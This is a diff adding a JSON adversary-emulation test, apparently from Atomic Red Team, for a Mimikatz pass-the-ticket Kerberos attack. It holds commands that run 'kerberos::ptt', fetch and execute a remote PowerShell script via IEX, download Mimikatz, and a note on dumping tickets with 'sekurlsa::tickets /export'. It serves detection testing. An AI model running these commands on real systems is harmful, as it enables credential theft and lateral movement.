@@ -1,0 +1,92 @@
+{
+  "id": "dbf38128-7ba7-4776-bedf-cc2eed432098",
+  "name": "Mimikatz Kerberos Ticket Attack",
+  "description": "Similar to PTH, but attacking Kerberos\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "56f7e700-a404-497b-82d9-8b0e9f26a20f",
+      "type": "execute-command",
+      "data": {
+        "command": "\"#{mimikatz_exe}\" \"kerberos::ptt #{ticket}\"\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "565373c5-fc03-419f-aa8d-ff3cd915dec0",
+      "name": "Check dependency 1/1",
+      "description": "Mimikatz must exist on disk at specified location (#{mimikatz_exe})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{mimikatz_exe}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "8e03f990-3813-4eda-9f26-637db6f73d46",
+      "name": "Resolve dependency 1/1",
+      "description": "Mimikatz must exist on disk at specified location (#{mimikatz_exe})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path \"#{mimikatz_exe}\" | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "124c64bc-eaf9-4e28-9198-27a743b9c1a4",
+      "name": "Re-check dependency 1/1",
+      "description": "Mimikatz must exist on disk at specified location (#{mimikatz_exe})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{mimikatz_exe}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "565373c5-fc03-419f-aa8d-ff3cd915dec0",
+      "p": "on-success",
+      "o": "56f7e700-a404-497b-82d9-8b0e9f26a20f"
+    },
+    {
+      "s": "565373c5-fc03-419f-aa8d-ff3cd915dec0",
+      "p": "on-failure",
+      "o": "8e03f990-3813-4eda-9f26-637db6f73d46"
+    },
+    {
+      "s": "8e03f990-3813-4eda-9f26-637db6f73d46",
+      "p": "on-success",
+      "o": "124c64bc-eaf9-4e28-9198-27a743b9c1a4"
+    },
+    {
+      "s": "124c64bc-eaf9-4e28-9198-27a743b9c1a4",
+      "p": "on-failure",
+      "o": "56f7e700-a404-497b-82d9-8b0e9f26a20f"
+    }
+  ],
+  "tags": [
+    "T1550.003",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "ticket",
+      "type": "string",
+      "description": "Ticket file name usually format of 'id-username\\@domain.kirbi' (e.g. can be dumped by \"sekurlsa::tickets /export\" module)",
+      "value": ""
+    },
+    {
+      "name": "mimikatz_exe",
+      "type": "path",
+      "description": "Path of the Mimikatz binary",
+      "value": "PathToAtomicsFolder\\..\\ExternalPayloads\\bin\\x64\\mimikatz.exe"
+    }
+  ]
+}
